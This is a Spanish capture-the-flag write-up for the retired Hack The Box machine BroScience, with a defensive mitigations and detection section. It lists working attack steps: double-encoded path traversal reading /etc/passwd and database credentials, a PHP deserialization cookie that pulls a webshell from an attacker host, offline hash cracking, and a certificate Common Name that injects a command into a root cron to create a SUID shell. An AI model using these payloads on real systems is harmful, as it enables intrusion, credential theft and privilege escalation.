---
machine: BroScience
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, php, lfi, deserialization, openssl]
---

# BroScience — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, ficha publicable.
> Ficha de referencia basada en documentación pública y writeups técnicos. Sin flags ni credenciales reales.

## TL;DR

Un portal PHP sobre Apache y PostgreSQL tiene una lectura de ficheros en `includes/img.php?path=`. El filtro de `../` se evade con doble URL-encoding (`%252f`). La lectura de `db_connect.php` entrega la contraseña de PostgreSQL y la sal del sitio; leyendo `activate.php` se entiende cómo se generan los códigos de activación. Tras activar una cuenta, la preferencia de tema se guarda como objeto PHP serializado en la cookie `user-prefs`; una cadena de gadgets `AvatarInterface`/`Avatar` permite escribir un webshell. Los hashes de la base de datos se crackean con `hashcat -m 20` y dan la contraseña SSH de `bill`. Un cron que revisa certificados con `openssl` inyecta comandos a través del Common Name y ejecuta como root.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp   ssh    OpenSSH 8.4p1 Debian
80/tcp   http   Apache 2.4.54 (redirige a HTTPS)
443/tcp  https  Apache 2.4.54 / PHP
```

El sitio es `broscience.htb`; el puerto 80 redirige al 443. Se añade el dominio a `/etc/hosts`.

## Enumeración

```bash
feroxbuster -k -u https://broscience.htb \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Endpoints relevantes: `index.php`, `login.php`, `register.php`, `activate.php`, `user.php`, `includes/img.php`. El parámetro `path` de `img.php` devuelve `Attack detected` con `../` directo.

## Foothold

La validación se aplica antes de decodificar la URL. Codificar dos veces las barras la esquiva:

```bash
curl -k 'https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'
```

```bash
curl -k 'https://broscience.htb/includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fvar%252fwww%252fhtml%252fincludes%252fdb_connect.php'
```

El segundo fichero contiene el usuario y la contraseña de PostgreSQL, la base `broscience` y la sal `NaCl` usada por `md5($salt . $password)`. Leer `activate.php` muestra que el código de activación se genera de forma predecible; se crea una cuenta y se prueban los códigos candidatos hasta activarla.

## Movimiento lateral

Con la sesión activa, la cookie `user-prefs` guarda la preferencia de tema como objeto serializado en base64. `get_theme()` llama a `unserialize()` sin `allowed_classes`. Las clases `AvatarInterface::__wakeup()` y `Avatar::save()` permiten copiar un fichero remoto a una ruta escribible:

```php
class Avatar { public $imgPath; public function save($tmp) { /* fopen/fwrite */ } }
class AvatarInterface { public $tmp; public $imgPath; public function __wakeup() { /* new Avatar(...)->save($this->tmp) */ } }
```

Se serializa un `AvatarInterface` con `tmp` apuntando a un webshell alojado en el atacante y `imgPath` a `/var/www/html/cmd.php`, se codifica en base64 y se envía en la cookie. Al visitar `cmd.php` se obtiene ejecución como `www-data`.

```bash
curl -k https://broscience.htb/cmd.php --data-urlencode 'cmd=id'
```

Desde la base de datos se extraen los hashes de los usuarios. El formato es `md5(salt . password)`, es decir, hashcat modo 20:

```bash
hashcat -m 20 hashes.txt /usr/share/wordlists/rockyou.txt
```

La contraseña de `bill` permite `su - bill` o SSH directo.

## Escalada de privilegios

`bill` puede escribir en el directorio `Certs` que consume un cron de root. El script ejecuta `openssl x509 -subject` y pasa el resultado por `awk`; el Common Name acaba dentro de una sustitución de comandos sin sanear.

Se genera un certificado con un CN que copia bash y le pone SUID:

```bash
openssl req -x509 -nodes -newkey rsa:2048 -keyout /dev/null \
  -out Certs/broscience.crt -days 1
# Common Name:
$(cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash)
```

Cuando el cron procesa el certificado, se crea `/tmp/rootbash`. Se ejecuta con `-p` para conservar privilegios:

```bash
/tmp/rootbash -p
```

## Evidencia

- Petición con `%252f` y salida de `/etc/passwd`.
- `db_connect.php` con la contraseña redactada.
- Cookie serializada y petición al webshell.
- `ls -l /tmp/rootbash` y `id`.

## Lecciones aprendidas

- El doble URL-encoding derrota filtros que examinan la cadena antes de decodificarla.
- `unserialize()` sin lista de clases permitidas es una primitiva de escritura de ficheros si existe un gadget.
- La sal no protege hashes MD5 débiles: solo evita tablas precalculadas.
- Un certificado es entrada no confiable; el CN nunca debe llegar a una shell.

## Mitigaciones y detección

- **Corrección:** canonicalizar la ruta y limitarla al directorio de imágenes; usar `unserialize($data, ['allowed_classes' => false])` o cookies firmadas; cambiar a `password_hash()` con Argon2/bcrypt; validar el CN y usar `escapeshellarg`; ejecutar el cron con el mínimo privilegio.
- **Detección:** peticiones con `%252f` o `%252e`; lectura de `db_connect.php`; cookies `user-prefs` con objetos PHP; creación de ficheros PHP en el docroot; procesos `openssl` que lanzan `sh` o `cp`; binarios SUID nuevos en `/tmp`.
- MITRE ATT&CK: T1190, T1505.003 (web shell), T1059.004 (Unix shell), T1548.001.

## Referencias

- <https://www.hackthebox.com/machines/BroScience>
- <https://0xdf.gitlab.io/2023/04/08/htb-broscience.html>
- <https://www.php.net/manual/en/function.unserialize.php>
- <https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection>
